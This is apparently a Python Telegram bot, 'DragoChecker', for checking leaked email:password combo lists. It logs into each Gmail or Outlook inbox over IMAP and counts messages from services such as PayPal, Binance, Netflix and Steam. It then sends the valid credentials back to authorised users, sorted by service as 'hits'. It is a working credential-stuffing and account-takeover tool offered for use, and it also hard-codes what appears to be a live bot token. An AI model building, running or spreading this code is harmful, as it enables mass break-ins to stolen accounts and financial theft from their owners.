#perfect
import logging
import imaplib
import re
import os
import asyncio
import time
import psutil
from concurrent.futures import ThreadPoolExecutor
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

from datetime import datetime
import pytz
import sys
import time  # Import the time module

ist = pytz.timezone('Asia/Kolkata')
# Define the expiration date       (year, month, day, hour, minute) in IST
expiration_date = ist.localize(datetime(2024, 10, 23, 5, 30))
# Get the current date and time in IST
current_date = datetime.now(ist)
# Display current date and expiration date with time
print(f"Current Date and Time (IST): {current_date.strftime('%Y-%m-%d %H:%M:%S')}")
print(f"Valid Till (IST): {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}")
# Wait for 2 seconds before checking expiration
time.sleep(2)
# Update the current date after the delay
current_date = datetime.now(ist)
# Check if the current date is past the expiration date
if current_date >= expiration_date:
    print("The expiration date has passed. Terminating the script.\n Made by @DragAditya")
    sys.exit()  # Terminate the script if expired
# If the script hasn't terminated, proceed with the tasks
print("\n Developer: @DragAditya \n\n.")

# Telegram bot token
BOT_TOKEN = '7802875946:AAGm5Sl06vLMhGw6CGru-fbKzPKbk4uQ40s'  # Replace with your actual bot token

# Configure logging
logging.basicConfig(
    format='%(asctime)s\n%(name)s - %(levelname)s - %(message)s\n',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Owners And Auths
OWNER_ID = [1183272367]
# Authorised Users
Auth = [1256497553,1183272367,5043055421,6410155683,6789842549]
# Number of emails per batch
BATCH_SIZE = 5

# Targets to check in emails
TARGETS = [
    "instagram.com", "netflix.com", "spotify.com", "paypal.com",
    "crunchyroll.com", "adobe.com","steam",
    "binance.com", "steam.com", "supercell.com", "twitter.com", 
    "amazon.com", "discord.com", "roblox.com", "snapchat.com", 
    "tiktok.com", "youtube.com", "linkedin.com", "riotgames.com", 
    "epicgames.com", "rockstargames.com", "twitch.tv", "playstation.com", 
    "ubisoft.com", "onlyfans.com", "pornhub.com", 
    "pubgmobile.com", "activision.com", "hotmail.com","USDT", "Bybit"]

# ThreadPoolExecutor to run blocking functions in background
executor = ThreadPoolExecutor()

# Function to extract valid email:password pairs from text
def extract_email_password_pairs(text):
    return re.findall(r'[^@\s]+@[^@\s]+\.[^:\s]+:[^:\s]+', text)

def format_progress_message(file_name, total_accounts, checked_count, batch_index, num_batches, hit_count, remaining_batches, user_name, start_time):
    elapsed_time = int(time.time() - start_time)
    progress_message = (
        f"• 𝗦𝗼𝘂𝗿𝗰𝗲 ⇾ {file_name}\n"
        f"• 𝗔𝗺𝗼𝘂𝗻𝘁 ⇾ {total_accounts}\n"
        f"• 𝗕𝗮𝘁𝗰𝗵 ⇾ {batch_index + 1}/{num_batches}\n"
        f"• 𝗛𝗶𝘁𝘀 ⇾ {hit_count}\n"
        f"• 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ⇾ <a href='https://t.me/DragAditya'>{user_name}</a>\n"
        f"• 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾ {elapsed_time} seconds\n"
        f"• 𝗗𝗲𝘃 ⇾ <a href='https://t.me/DragAditya'>DragAditya</a>"
    )
    return progress_message

# Asynchronous function to handle email inbox checking
async def check_email_inbox_async(email_user, email_pass, targets):
    if "hotmail.com" in email_user or "outlook.com" in email_user:
        imap_server = "imap-mail.outlook.com"
    elif "gmail.com" in email_user:
        imap_server = "imap.gmail.com"
    else:
        return None

    mail = imaplib.IMAP4_SSL(imap_server)
    try:
        mail.login(email_user, email_pass)
    except imaplib.IMAP4.error:
        return None

    try:
        mail.select("inbox")
    except imaplib.IMAP4.error:
        return None

    results = {}
    for target in targets:
        try:
            status, messages = mail.search(None, f'FROM "{target}"')
            if status == "OK":
                results[target] = len(messages[0].split())
            else:
                results[target] = 0
        except:
            results[target] = 0

    try:
        mail.logout()
    except imaplib.IMAP4.error:
        pass  # Ignore logout errors

    return results

# Run the long task in the background to keep bot responsive
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.info("\nReceived a Document.\n")

    user_id = update.message.from_user.id
    if user_id not in Auth:
        await update.message.reply_text("You are not authorized.\nContact @DragAditya for permission.")
        return

    document = update.message.document
    if document.mime_type != "text/plain":
        await update.message.reply_text('Please send a .txt file containing the combo (email:password).')
        return

    logger.info(f"Document MIME type: {document.mime_type}")

    # Inform the user that the process is starting
    await update.message.reply_text("Processing your file... Please wait. This may take some time.")
    
    # Schedule the long task to run in the background
    asyncio.create_task(process_file(update, context, document))

# Function that handles the actual long task of processing the file
async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE, document):
    try:
        file = await document.get_file()
        file_path = await file.download_to_drive()
        file_name = document.file_name
        logger.info(f"File downloaded to: {file_path}")

        combos = await asyncio.get_running_loop().run_in_executor(executor, filter_combos, file_path)
        logger.info(f"Filtered combos: {combos}")
        if not combos:
            await update.message.reply_text('No valid email:password pairs found or no emails processed.')
            return

        total_combos = len(combos)
        num_batches = (total_combos + BATCH_SIZE - 1) // BATCH_SIZE
        progress_message = await update.message.reply_text(
            format_progress_message(
                file_name=file_name,
                total_accounts=total_combos,
                checked_count=0,
                batch_index=0,
                num_batches=num_batches,
                hit_count=0,
                remaining_batches=num_batches - 1,
                user_name=update.message.from_user.username or 'unknown',
                start_time=time.time()
            ),
            parse_mode='HTML'
        )

        combo_pairs = [combos[i:i + BATCH_SIZE] for i in range(0, total_combos, BATCH_SIZE)]
        start_time = time.time()

        # Initialize a dictionary to collect results for Combined.txt
        combined_results = {target: [] for target in TARGETS}

        for batch_index, batch in enumerate(combo_pairs):
            processed_count = 0
            wrong_count = 0
            hit_count = 0
            results = []

            tasks = []
            for combo in batch:
                email_user, email_pass = combo.split(':')
                task = asyncio.create_task(check_email_inbox_async(email_user, email_pass, TARGETS))
                tasks.append(task)

            results_list = await asyncio.gather(*tasks)

            for i, data in enumerate(results_list):
                if data:
                    email_user, email_pass = batch[i].split(':')
                    results.append((email_user, email_pass, data))
                    processed_count += 1
                    if any(count > 0 for count in data.values()):
                        hit_count += 1
                        # Add hits to combined_results
                        for target, count in data.items():
                            if count > 0:
                                combined_results[target].append((count, email_user, email_pass))
                    else:
                        wrong_count += 1
                else:
                    wrong_count += 1

            remaining_batches = num_batches - (batch_index + 1)
            progress_message_text = format_progress_message(
                file_name=file_name,
                total_accounts=total_combos,
                checked_count=(batch_index + 1) * BATCH_SIZE,
                batch_index=batch_index,
                num_batches=num_batches,
                hit_count=hit_count,
                remaining_batches=remaining_batches,
                user_name=update.message.from_user.username or 'unknown',
                start_time=start_time
            )

            await context.bot.edit_message_text(
                progress_message_text,
                chat_id=update.effective_chat.id,
                message_id=progress_message.message_id,
                parse_mode='HTML'
            )

            if results:
                response_text = "» ━━━━» Hotmail «━━━━ «\n\n"
                for email, password, data in results:
                    response_text += (
                        "┏━━━━━━━•.⁠｡⁠*⁠♡\n"
                        f"┃ {email}\n"
                        f"┃ {password}\n"
                        "┗━━━━━━━━━━━✧⁠*⁠。\n\n"
                    )
                    for target, count in data.items():
                        if count > 0:
                            response_text += f"⤷ {count:02d} Email : {target}\n"
                    response_text += "\n"

                response_text += "❛ ━━━━･ DragAdi ･━━━ ❜\n"

                output_file_path = f"HotMail_{batch_index + 1}.txt"
                await asyncio.get_running_loop().run_in_executor(executor, write_output_file, output_file_path, response_text)
                await update.message.reply_document(document=open(output_file_path, 'rb'))

        # Generate Combined.txt after processing all batches
        combined_output = []
        for target, hits in combined_results.items():
            if hits:
                combined_output.append(f"{target}:")
                for count, email, password in hits:
                    combined_output.append(f"⤷ {count:03d} | {email}:{password}")
                combined_output.append("")  # Add an empty line for separation

        if combined_output:  # Check if there are results to write
            combined_file_path = "⁠.⁠｡⁠*⁠♡Combined.txt"
            await asyncio.get_running_loop().run_in_executor(executor, write_output_file, combined_file_path, "\n".join(combined_output))
            await update.message.reply_document(document=open(combined_file_path, 'rb'))
        else:
            await update.message.reply_text("No hits were found")

    except Exception as e:
        logger.exception("Error processing file:", exc_info=e)
        await update.message.reply_text("An error occurred while processing the file.")
            


# Helper functions for file processing
def filter_combos(file_path):
    with open(file_path, 'r') as file:
        text = file.read()
    return extract_email_password_pairs(text)

def write_output_file(output_file_path, response_text):
    with open(output_file_path, 'w') as f:
        f.write(response_text)

async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = None
    document = None

    # Check if it's a reply to a message with text
    if update.message.reply_to_message:
        if update.message.reply_to_message.text:
            text = update.message.reply_to_message.text
        elif update.message.reply_to_message.document:
            document = update.message.reply_to_message.document

    # If /clear is followed by text directly
    if update.message.text and not document:
        # Extract the text following the command
        text = update.message.text[len("/clear "):]

    # If a document is present
    if document:
        if document.mime_type != "text/plain":
            await update.message.reply_text("Please reply with a .txt file containing the combos.")
            return

        # Download the file and extract its content
        file = await document.get_file()
        file_path = await file.download_to_drive()
        
        with open(file_path, 'r') as f:
            text = f.read()

        # Clean up the downloaded file after processing
        os.remove(file_path)

    # If no text was found
    if not text:
        await update.message.reply_text("Please provide valid input or reply with a valid .txt file.")
        return

    # Extract valid email:password pairs
    email_password_pairs = extract_email_password_pairs(text)

    if not email_password_pairs:
        await update.message.reply_text("No valid email:password pairs found.")
        return

    # If 10 or fewer pairs, send them directly in chat
    if len(email_password_pairs) <= 10:
        await update.message.reply_text("\n".join(email_password_pairs))
    else:
        # If more than 10 pairs, send a downloadable file
        output_file = "SeparatedCombo.txt"
        with open(output_file, 'w') as f:
            f.write("\n".join(email_password_pairs))

        await update.message.reply_document(document=open(output_file, 'rb'))
        os.remove(output_file)

# /id command: Show The User Id
async def id(update: Update, _):
    user_id = update.message.from_user.id
    if user_id in Auth:
        await update.message.reply_text(f"Your user ID is: `{user_id}`", parse_mode="MarkdownV2")
    else:
        await update.message.reply_text(f"You Are Authorised User")


# /list command: Show all current target domains
async def list_targets(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    target_list = "\n".join(f"- {target}" for target in TARGETS)
    await update.message.reply_text(f"📋 <b>Current Target Domains:</b>\n{target_list}", parse_mode='HTML')


# /addtarget command: Add a domain to the target list
async def add_target(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not context.args:
        await update.message.reply_text("Please provide a domain to add. Usage: /addtarget domain.com")
        return

    new_target = context.args[0].lower()

    if new_target in TARGETS:
        await update.message.reply_text(f"🔸 <b>{new_target}</b> is already in the target list!", parse_mode='HTML')
    else:
        TARGETS.append(new_target)
        await update.message.reply_text(f"✅ <b>{new_target}</b> added to the target list!", parse_mode='HTML')


# /remtarget command: Remove a domain from the target list
async def remove_target(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not context.args:
        await update.message.reply_text("Please provide a domain to remove. Usage: /remtarget domain.com")
        return

    target_to_remove = context.args[0].lower()

    if target_to_remove in TARGETS:
        TARGETS.remove(target_to_remove)
        await update.message.reply_text(f"❌ <b>{target_to_remove}</b> removed from the target list!", parse_mode='HTML')
    else:
        await update.message.reply_text("Please provide a domain to remove. Usage: /remtarget domain.com")
        return

    target_to_remove = context.args[0].lower()

    if target_to_remove in TARGETS:
        TARGETS.remove(target_to_remove)
        await update.message.reply_text(f"❌ <b>{target_to_remove}</b> removed from the target list!", parse_mode='HTML')
    else:
        await update.message.reply_text(f"🔸 <b>{target_to_remove}</b> is not in the target list!", parse_mode='HTML')        


# Commands for basic bot actions
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    message = await update.message.reply_text("Connecting.")  # Initial message

    # Simulate connecting animation
    for dots in range(3):
        new_text = "Connecting" + "." * (dots + 1)
        if new_text != message.text:  # Only edit if the text has changed
            await message.edit_text(new_text)
        await asyncio.sleep(1)

    # Check authorization
    if user_id in Auth:
        if "Access Granted ✅" != message.text:  # Only edit if different
            await message.edit_text("Access Granted ✅")
        await asyncio.sleep(3)  # Wait before showing next message

        # Send welcome message
        welcome_text = (
            "Welcome to DragoChecker Bot! 🎉\n"
            "Send email:pass in .txt format."
        )
        keyboard = [
            [InlineKeyboardButton("Contact Creator", url="https://t.me/DragAditya")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        if welcome_text != message.text:  # Only edit if different
            await message.edit_text(welcome_text, reply_markup=reply_markup)
    else:
        if "Access Denied ❌\nPlease contact the creator." != message.text:  # Only edit if different
            await message.edit_text("Access Denied ❌\nPlease contact the creator.")
        await asyncio.sleep(3)  # Wait before showing next message
        keyboard = [
            [InlineKeyboardButton("Contact Creator", url="https://t.me/DragAditya")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        if "You are not an authorized user." != message.text:  # Only edit if different
            await message.edit_text("You are not an authorized user.", reply_markup=reply_markup)


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("Send a .txt file with email:password combinations for checking.")


async def stats_ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Send a temporary message while gathering stats
    msg = await update.message.reply_text("🔍 Gathering stats...")

    # System stats
    cpu_usage = psutil.cpu_percent()
    memory = psutil.virtual_memory()
    total_memory = memory.total // (1024 ** 2)  # In MB
    used_memory = memory.used // (1024 ** 2)  # In MB
    latency = time.time() - update.message.date.timestamp()

    # Formatting the response with emojis and Markdown
    stats_message = f"""
🎯 **Pong!**

💡 **Bot Latency:** `{latency:.3f}` seconds
🖥 **CPU Usage:** `{cpu_usage}%`
📊 **Memory Usage:** `{used_memory}MB/{total_memory}MB`
🕒 **Uptime:** `{time.strftime('%H:%M:%S', time.gmtime(time.time() - psutil.boot_time()))}`
    """
    # Edit the original message to show the stats
    await msg.edit_text(stats_message, parse_mode='Markdown')

# Main function
if __name__ == '__main__':
       # Create the Application and pass it your bot's token.
    application = Application.builder().token(BOT_TOKEN).build()

    # On different commands - answer in Telegram
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    
    # New command handlers
    application.add_handler(CommandHandler("list", list_targets))
    application.add_handler(CommandHandler("addtarget", add_target))
    application.add_handler(CommandHandler("remtarget", remove_target))
    application.add_handler(CommandHandler("clear", clear_command))
    application.add_handler(CommandHandler("id", id))
    application.add_handler(CommandHandler("ping", stats_ping))
    # On non-command i.e message - handle the document
    application.add_handler(MessageHandler(filters.Document.MimeType("text/plain"), handle_document))

    
    logger.info("\n\n━━━━━━━━━━━━━━━━━━━| Running |━━━━━━━━━━━━━━━━━━━━\n\n")
    application.run_polling()
